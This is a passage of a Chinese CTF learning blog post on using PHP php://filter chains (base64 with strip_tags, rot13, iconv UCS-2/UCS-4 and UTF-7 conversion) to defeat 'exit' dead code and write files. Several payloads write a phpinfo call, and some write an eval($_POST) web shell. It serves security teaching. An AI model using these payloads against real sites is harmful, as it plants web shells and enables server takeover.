<p>进行拼接之后就是<code>&lt;?php exit();php://filter/convert.base64-decode/resource=PD9waHAgcGhwaW5mbygpOz8+.php</code>然后会对其进行一次整体的base64-decode。从而分解掉死亡代码，但是有个小问题，当时我也有点不解，一直无法生成content；虽然文件创建成功，但是就是无法生成content。翻了翻cyc1e师傅的文章，和其他文章 ，发现问题在于resource后面的‘&#x3D;’；<br>都知道‘&#x3D;’在base64中的作用是填充，也就是以为着结束；在‘&#x3D;’的后面是不允许有任何其他字符的否则会报错，有的解码程序会自动忽略后面的字符从而正常解码，其实实际上还是有问题的。如下图所示；<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662418956035-b2b94baa-ae47-4832-95c2-d9792322a080.png#averageHue=%23fefcfc&clientId=ud9101c01-db66-4&from=paste&height=270&id=ub5876a51&name=image.png&originHeight=337&originWidth=527&originalType=binary&ratio=1&rotation=0&showTitle=false&size=7859&status=done&style=none&taskId=u44fee965-d170-460a-a008-0516490b192&title=&width=421.6" alt="image.png"><br>那现在我们的思路就比较清晰了，要躲避这个&#x3D;就可以</p>
<h4 id="2-嵌套base64"><a href="#2-嵌套base64" class="headerlink" title="2.嵌套base64"></a>2.嵌套base64</h4><p>payload：<code> php://filter/string.strip.tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2B.php</code><br><strong>由于用到了strip.tags自然要求php版本为5</strong><br>我们测试看看载荷效果；<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662419939275-4b89a45f-0367-4e94-b776-833cb9ad5b3e.png#averageHue=%230b0806&clientId=ud9101c01-db66-4&from=paste&height=110&id=u2dfae87c&name=image.png&originHeight=137&originWidth=849&originalType=binary&ratio=1&rotation=0&showTitle=false&size=16525&status=done&style=none&taskId=ucc41dafe-5c3b-43e0-9220-089a038878d&title=&width=679.2" alt="image.png"><br>这边进行拼接后结果就是<code>&lt;?php exitphp://filter/string.strip.tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2B.php</code>,然后由于有string.strip.tags，所以<code>&lt;?php exitphp://filter/string.strip.tags|convert.base64-decode/resource=?&gt;</code>变为空，<br>最终剩下的代码为：<code>PD9waHAgcGhwaW5mbygpOz8%2B.php</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662420097314-99418442-f6d3-41f0-8afc-5e8096da004b.png#averageHue=%23faf9f8&clientId=ud9101c01-db66-4&from=paste&height=306&id=u5f5fdb49&name=image.png&originHeight=383&originWidth=381&originalType=binary&ratio=1&rotation=0&showTitle=false&size=26165&status=done&style=none&taskId=u26ebff47-5bef-485d-9e6d-451ff5aaca5&title=&width=304.8" alt="image.png"><br>最后得到可以得到我们要运行的代码</p>
<p>发现可以生成文件，并且可以看到我们已经成功写入了shell；但是文件名确实有问题，当我们在浏览器访问的时候，会出现访问不到的问题，这里是因为引号的问题；那么如何避免，我们可以使用伪目录的方法，进行变相的绕过去；</p>
<p><strong>更完美的payload</strong>：<code>php://filter/write=string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2B/../s1mple.php</code></p>
<p>跟上面的思路一样，黏贴后：<code>&lt;?php exit();php://filter/write=string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8+/../s1mple.php</code></p>
<p>删掉<?...........?>之间的东西后剩余<code>PD9waHAgcGhwaW5mbygpOz8+/../s1mple.php</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662420452564-a82f6804-d40e-49db-8b30-a06ba165be4a.png#averageHue=%23fbfaf9&clientId=ud9101c01-db66-4&from=paste&height=303&id=u8b74941b&name=image.png&originHeight=379&originWidth=592&originalType=binary&ratio=1&rotation=0&showTitle=false&size=30716&status=done&style=none&taskId=u72257120-59aa-424f-86c6-1432e4e4b44&title=&width=473.6" alt="image.png"><br>还是可以得到我们要的代码，可以被执行</p>
<p>我们将前面的一串base64字符和闭合的符号整体看作一个目录，虽然没有，但是我们后面重新撤回了原目录，生成s1mple.php文件；从而就可以生成正常的文件名；载荷效果如下：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662420553624-24e3d12a-3960-47ac-9ea9-94b9127b454b.png#averageHue=%23100d09&clientId=ud9101c01-db66-4&from=paste&height=100&id=u7270f8d3&name=image.png&originHeight=125&originWidth=796&originalType=binary&ratio=1&rotation=0&showTitle=false&size=15872&status=done&style=none&taskId=uc445196f-02d5-4526-aa6b-859a2ff5974&title=&width=636.8" alt="image.png"></p>
<h4 id="3-一种另类base嵌套（某博客说的）"><a href="#3-一种另类base嵌套（某博客说的）" class="headerlink" title="3.一种另类base嵌套（某博客说的）"></a>3.一种另类base嵌套（某博客说的）</h4><p>payload:<code>php://filter/&lt;?|string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2B/../s1mple.php</code><br><strong>我的思路：</strong><br>老样子黏贴起来后：<code>&lt;?php exit();php://filter/&lt;?|string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2B/../s1mple.php</code></p>
<p>strip_tags去掉<?    ?>中的内容后:<code>PD9waHAgcGhwaW5mbygpOz8%2B/../s1mple.php</code></p>
<p>最后进行base64编码得出最后的内容：<?php phpinfo();?>5^<br>达到命令执行的目的</p>
<p><strong>某博客的解释</strong>：</p>
<p>他的意思是代码粘起来：<code>&lt;?php exit();php://filter/&lt;?|string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2B/../s1mple.php</code>之后<br>strip_tags去除内容后为：&lt;?php exit();<code>PD9waHAgcGhwaW5mbygpOz8%2B/../s1mple.php</code></p>
<p>**反驳点一：<br>**将这段话进行base64解码后结果为：<br>^ƫOܚ[ʊNϏͦW<br>一堆乱码！<br><strong>反驳点二：</strong><br>按博主的意思应该是，<code>&lt;?|string.strip_tags|convert.base64-decode/resource=?&gt;</code>这段内容闭合了，结果留下了<code>&lt;?php exit();</code>和<code>PD9waHAgcGhwaW5mbygpOz8%2B/../s1mple.php</code><br>实际的结果如何呢？：<br>我做了一个脚本测试</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$filename</span>=<span class="string">&#x27;php://filter/string.strip_tags|convert.base64-decode/resource=1.php&#x27;</span>;</span><br><span class="line"><span class="variable">$content</span>=<span class="string">&#x27;?&gt;PD9waHAgcGhwaW5mbygpOz8+&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>,<span class="string">&quot;&lt;?php exit()&lt;?;&quot;</span>.<span class="variable">$content</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这里正常连接起来后为：<code>&lt;?php exit()&lt;?;?&gt;PD9waHAgcGhwaW5mbygpOz8+</code><br>按照博主的意思，最后1.php里的内容为：<br><code>&lt;?php exit()PD9waHAgcGhwaW5mbygpOz8+</code>解码后：<br>^ƫOܚ[ʊNϏ</p>
<p>实际内容：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662421987496-6e692459-6bb9-4819-b9c3-94cd42246141.png#averageHue=%233f4750&clientId=ud9101c01-db66-4&from=paste&height=142&id=u5f5ab2de&name=image.png&originHeight=178&originWidth=279&originalType=binary&ratio=1&rotation=0&showTitle=false&size=5499&status=done&style=none&taskId=ub23fa085-f8e6-455c-aab2-beb18bc1f71&title=&width=223.2" alt="image.png"><br>所以2，3实际是同一种类型的base64嵌套，并不是什么另类</p>
<h4 id="4-rot13"><a href="#4-rot13" class="headerlink" title="4.rot13"></a>4.rot13</h4><p>尽管base64比较特别，但是并不是所有的编码都受限于‘&#x3D;’，这里可以采用rot13编码即可；<br><code>php://filter/write=string.rot13|&lt;?cuc cucvasb();?&gt;|/resource=s1mple.php</code>这里<code>&lt;?php phpinfo();?&gt;</code>的rot13编码即为<code>&lt;?cuc cucvasb();?&gt;</code>,所以这里可以进行写入；载荷效果如下：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662422280953-b6266c4e-dc67-426d-8ff1-4e5b25309b22.png#averageHue=%23090605&clientId=ud9101c01-db66-4&from=paste&height=82&id=u3f9b3489&name=image.png&originHeight=103&originWidth=1256&originalType=binary&ratio=1&rotation=0&showTitle=false&size=12970&status=done&style=none&taskId=u675c4b8f-dccc-4d28-9206-19e5ae1a97d&title=&width=1004.8" alt="image.png"></p>
<h4 id="5-convert-iconv"><a href="#5-convert-iconv" class="headerlink" title="5.convert.iconv."></a>5.convert.iconv.</h4><p>这个过滤器需要 php 支持 iconv，而 iconv 是默认编译的。使用convert.iconv.*过滤器等同于用iconv()函数处理所有的流数据。 然而 我们可以留意到 iconv — 字符串按要求的字符编码来转换;;其用法：iconv ( string $in_charset , string $out_charset , string $str ) : string 将字符串 str 从 in_charset 转换编码到 out_charset。 就其功能而论，有点类似于base_convert的功效一样，只不过二者还是有作用的区别，只是都是涉及编码转换的问题而已；（可以类比）；由此记得国赛的一道love_math的题目，有了base_convert之后就可以尽情的转换从而getshell；</p>
<p>那么我们就可以借用此过滤器，从而进行编码的转换，写入我们需要的代码，然后转换掉死亡代码，其实本质上来说也是利用了编码的转换；</p>
<h5 id="usc-2"><a href="#usc-2" class="headerlink" title="usc-2"></a>usc-2</h5><p>通过usc-2的编码进行转换；对目标字符串进行2位一反转；（因为是两位一反转，所以字符的数目需要保持在偶数位上）<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662422338709-22ba7197-569d-4af3-8fcd-04ccffeacd31.png#averageHue=%23060503&clientId=ud9101c01-db66-4&from=paste&height=70&id=ub056398a&name=image.png&originHeight=87&originWidth=799&originalType=binary&ratio=1&rotation=0&showTitle=false&size=6671&status=done&style=none&taskId=ubed8fd86-6298-405a-80fa-3ae35713b42&title=&width=639.2" alt="image.png"><br>payload：<code>php://filter/convert.iconv.UCS-2LE.UCS-2BE|?&lt;hp pe@av(l_$OPTSs[m1lp]e;)&gt;?/resource=s1mple.php;</code>其实也是变向的转换回来，从而利用那一次转换对死亡代码进行扰乱；载荷效果如下：<img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662422357685-de42826b-d3fe-4cf3-92ef-c8335bcf1d6b.png#averageHue=%23090705&clientId=ud9101c01-db66-4&from=paste&height=96&id=udce339e5&name=image.png&originHeight=120&originWidth=1505&originalType=binary&ratio=1&rotation=0&showTitle=false&size=16136&status=done&style=none&taskId=u8f2cc0c3-a613-4030-8d03-8675d18abfa&title=&width=1204" alt="image.png"></p>
<h5 id="usc-4"><a href="#usc-4" class="headerlink" title="usc-4"></a>usc-4</h5><p>活用convert.iconv。可以进行usc-4编码转化；就是4位一反转；类比可知，构造的shell代码应该是usc-4中的4倍数；<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662422375636-493b161e-7f08-4956-ae53-ef557c9c38cf.png#averageHue=%23090705&clientId=ud9101c01-db66-4&from=paste&height=88&id=ua0840e6e&name=image.png&originHeight=110&originWidth=1169&originalType=binary&ratio=1&rotation=0&showTitle=false&size=13652&status=done&style=none&taskId=ufe886e98-c3a2-40ed-aa15-0b17ee1b459&title=&width=935.2" alt="image.png"><br>通过测试我们可以明确的看到确实是需要是4的倍数才可以进行，否则会进行报错；</p>
<p>payload：<code>php://filter/convert.iconv.UCS-4LE.UCS-4BE|hp?&lt;e@%20p(lavOP_$s[TS]pm1&gt;?;)/resource=s1mple.php</code>荷载效果如下：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662422503706-994b97ba-0fef-464f-bf4d-b56c2bb1089a.png#averageHue=%230b0705&clientId=ud9101c01-db66-4&from=paste&height=83&id=u7c0d7237&name=image.png&originHeight=104&originWidth=1445&originalType=binary&ratio=1&rotation=0&showTitle=false&size=18180&status=done&style=none&taskId=ufeb242f2-76d2-47b1-9f18-819e90e5d8c&title=&width=1156" alt="image.png"></p>
<h5 id="utf-8与utf-7之间的转化"><a href="#utf-8与utf-7之间的转化" class="headerlink" title="utf-8与utf-7之间的转化"></a>utf-8与utf-7之间的转化</h5><p>经过测试发现如下的现象：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662422525298-7fd74940-69d2-4025-98b3-54ac5884d021.png#averageHue=%23030201&clientId=ud9101c01-db66-4&from=paste&height=82&id=u098b6d8c&name=image.png&originHeight=103&originWidth=565&originalType=binary&ratio=1&rotation=0&showTitle=false&size=3234&status=done&style=none&taskId=u6db6d2a8-f308-4673-a697-970e85330ec&title=&width=452" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662422530228-e7d95f34-3169-4b3a-9164-051bb6783a08.png#averageHue=%23050403&clientId=ud9101c01-db66-4&from=paste&height=87&id=ud3134346&name=image.png&originHeight=109&originWidth=776&originalType=binary&ratio=1&rotation=0&showTitle=false&size=7262&status=done&style=none&taskId=uf92f47bb-85cd-4923-868a-4491a0530de&title=&width=620.8" alt="image.png"><br>这里发现生成的是<code>+AD0-</code>,然而经过检测，此字符串可以被base64进行解码；那也就意味着我们可以<code>使用这种方法避免等号对我们base64解码的影响</code>；我们可以直接写入base64加密后的payload，然后将其进行utf之间的转换，因为纯字符转换之后还是其本身；所以其不受影响，进而我们的base64-encode之后的编码依然是存在的，然后进行base64-decode一下，写入shell；算上是一种组合拳；</p>
<p>payload:<code>php://filter/write=PD9waHAgQGV2YWwoJF9QT1NUWydhJ10pOz8+|convert.iconv.utf-8.utf-7|convert.base64-decode/resource=s1mple.php </code>载荷效果如下：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662422572807-e1d07f36-ccc7-4609-8cf6-a3d53698044d.png#averageHue=%23fbf9f7&clientId=ud9101c01-db66-4&from=paste&height=407&id=u7906b14b&name=image.png&originHeight=509&originWidth=1474&originalType=binary&ratio=1&rotation=0&showTitle=false&size=102910&status=done&style=none&taskId=u6962f663-48ed-4831-8064-9626305783a&title=&width=1179.2" alt="image.png"></p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><ul>
<li>以上所有的操作都应该是在linux系统中去完成的，因为windows不支持?&gt;文件开头</li>
<li>2，3实际是同一种类型</li>
<li>熟练运用Filter伪协议</li>
<li>base64的解密规则是四转三</li>
<li>conver.iconv类</li>
</ul>
<p>参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8163#toc-3">https://xz.aliyun.com/t/8163#toc-3</a></p>

    </div>

    
    <div class="about">
        <h1>About this Post</h1>
        <div class="details">
            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
        </div>
        
        <p class="tags">
            
            <i class="icon"></i>
            <a href="/tags/CTF/" class="tag">#CTF</a><a href="/tags/入门/" class="tag">#入门</a><a href="/tags/新人同学/" class="tag">#新人同学</a>
        </p>
        
    </div>
    

    <div class="container post-prev-next">
        
        <a href="/2023/03/02/%E4%B8%8D%E8%A6%81%E6%8D%89%E5%BC%84%E6%88%91%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6%EF%BC%9AH/" class="next">
            <div>
                <div class="text">
                    <p class="label">Next</p>
                    <h3 class="title">不要捉弄我新人同学: H</h3>
                </div>
            </div>
        </a>
        
        
        <a href="/2023/03/02/%E4%B8%8D%E8%A6%81%E6%8D%89%E5%BC%84%E6%88%91%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6%EF%BC%9AB/" class="prev">
            <div>
                <div class="text">
                    <p class="label">Previous</p>
                    <h3 class="title">不要捉弄我新人同学: B</>
                </div>
            </div>
        </a>
        
    </div>

    
        
        
        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
        
    
</article>

        <footer>
    <div class="inner">
        <div class="links">
            
            <div class="group">
                <h2 class="title">Blog</h2>
                
                <a href="/" class="item">Blog</a>
                
                <a href="/archives" class="item">Archives</a>
                
                <a href="/tags" class="item">Tags</a>
                
                <a href="/categories" class="item">Categories</a>
                
                <a href="/search" class="item">Search</a>
                
                <a href="/friends" class="item">Friends</a>
                
                <a href="/about" class="item">About</a>
                
                <a href="/atom.xml" class="item">RSS</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Projects</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Me</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
                
                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
                
                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
                
                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
                
                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
                
                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
                
            </div>
            
        </div>
        <span>&copy; 2025 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
        
        
            <br>
            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
                <label>
                    <input type="radio" value="light">
                    <span>Light</span>
                </label>
                <label>
                    <input type="radio" value="dark">
                    <span>Dark</span>
                </label>
                <label>
                    <input type="radio" value="auto">
                    <span>Auto</span>
                </label>
            </div>
        
    </div>
</footer>


        
<script src="/js/main.js"></script>

        
        
        

        
        <script src="https://unpkg.com/scrollreveal"></script>
		
        <script>
            window.addEventListener('load', () => {
                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
                ScrollReveal().reveal('.post-list-item .cover-img img')
                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
            })
        </script>
        
    </body>
</html>